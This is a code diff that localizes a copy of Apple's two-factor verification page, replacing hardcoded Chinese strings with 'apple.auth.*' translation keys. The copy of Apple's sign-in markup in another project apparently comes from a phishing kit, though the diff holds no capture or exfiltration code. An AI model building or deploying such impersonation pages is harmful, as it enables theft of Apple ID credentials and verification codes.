@@ -27,30 +27,17 @@
                             <hsa2 class="auth-v1" suppress-iforgot="{suppressIforgot}"
                                   skip-trust-browser-step="{skipTrustBrowserStep}">
 
-
-
-
-
-
                                 <div class="hsa2">
 
                                     <verify-device {two-factor-verification-support-url}="twoFactorVerificationSupportUrl"
                                                    {recovery-available}="recoveryAvailable" suppress-iforgot="{suppressIforgot}">
 
-
-
-
-
-
                                         <div class="verify-device fade-in ">
                                             <div class="">
                                                 <app-title>
-
-
                                                     <h1 tabindex="-1" class="si-container-title tk-callout  ">
 
-                                                        双重认证
-
+                                                        {{ __('apple.auth.two_factor_authentication') }}
                                                     </h1>
                                                 </app-title>
                                                 <div class="sec-code-wrapper">
@@ -133,12 +120,13 @@
 
                                                 <div class="pop-container error tk-subbody hide" tabindex="-1"
                                                      role="tooltip">
-                                                    <div class="error pop-bottom">验证码不正确</div>
+                                                    <div
+                                                        class="error pop-bottom">{{ __('apple.auth.incorrect_verification_code') }}</div>
                                                 </div>
 
                                                 <div class="si-info">
                                                     <p>
-                                                        一条包含验证码的信息已发送至你的设备。点击允许，并输入验证码以继续。
+                                                        {{ __('apple.auth.info') }}
                                                     </p>
                                                 </div>
 
@@ -221,21 +209,21 @@
                                                 </div>
 
                                                 <div class="verifying-code-text hide thin">
-                                                    正在验证…
+                                                    {{ __('apple.auth.verifying') }}
                                                 </div>
 
                                                 <button
                                                         class="button-link si-link ax-outline tk-subbody lite-theme-override"
                                                         id="no-trstd-device-pop" href="#" aria-haspopup="dialog"
                                                         aria-expanded="false">
-                                                    没有收到验证码？
+                                                    {{ __('apple.auth.did_not_receive_verification_code') }}
                                                 </button>
                                             </div>
 
                                             <other-options-popover {(show-alternate-options)}="showAlternateOptions"
                                                                    anchor-element="#no-trstd-device-pop">
                                                 <div class="other-options-popover-container hide" tabindex="-1"
-                                                     role="dialog" aria-label="其他选项">
+                                                     role="dialog" aria-label="{{ __('apple.auth.other_options') }}">
 
                                                     <div class="pop-container hsa2-no-code">
                                                         <div class="pop-bottom options">
@@ -250,11 +238,11 @@
                                                                                     class="si-link link ax-outline tk-subbody-headline"
                                                                                     id="try-again-link" href="#"
                                                                                     aria-describedby="tryAgainInfo">
-                                                                                重新发送验证码
+                                                                                {{ __('apple.auth.resend_verification_code') }}
                                                                             </button>
 
                                                                             <p id="tryAgainInfo" class="tk-subbody">
-                                                                                获取新验证码。
+                                                                                {{ __('apple.auth.get_new_verification_code') }}
                                                                             </p>
                                                                         </div>
                                                                     </div>
@@ -269,11 +257,11 @@
                                                                                     class="si-link link ax-outline tk-subbody-headline"
                                                                                     id="use-phone-link" href="#"
                                                                                     aria-describedby="usePhoneInfo">
-                                                                                发送短信给我
+                                                                                {{ __('apple.auth.send_text_message') }}
                                                                             </button>
 
                                                                             <p id="usePhoneInfo" class="tk-subbody">
-                                                                                获取一条包含代码的短信。
+                                                                                {{ __('apple.auth.get_code') }}
                                                                             </p>
                                                                         </div>
                                                                     </div>
@@ -289,12 +277,13 @@
                                                                                id="need-help-link"
                                                                                ($click)="accRecoveryClick(%event)"
                                                                                href="#">
-                                                                                更多选项…<span class="sr-only">在新窗口中打开。</span>
+                                                                                {{ __('apple.auth.more_options') }}<span
+                                                                                    class="sr-only">{{ __('apple.auth.opens_new_window') }}</span>
                                                                             </a>
 
 
                                                                             <p id="useNeedHelpInfo" class="tk-subbody">
-                                                                                请确认你的电话号码，以获得支持。
+                                                                                {{ __('apple.auth.please_confirm_your_phone_number_for_support') }}
                                                                             </p>
                                                                         </div>
                                                                     </div>
@@ -305,30 +294,13 @@
 
                                                 </div>
                                             </other-options-popover>
-
                                         </div>
-
-
                                     </verify-device>
-
-
-
                                 </div>
-
-
                             </hsa2>
                         </div>
                     </div>
                     <div id="stocking" style="display:none !important;"></div>
-
-
-
-
-
-
-
-
-
 
                 </div>
                 <idms-modal wrap-class="full-page-error-wrapper " {(show)}="showfullPageError" auto-close="false">
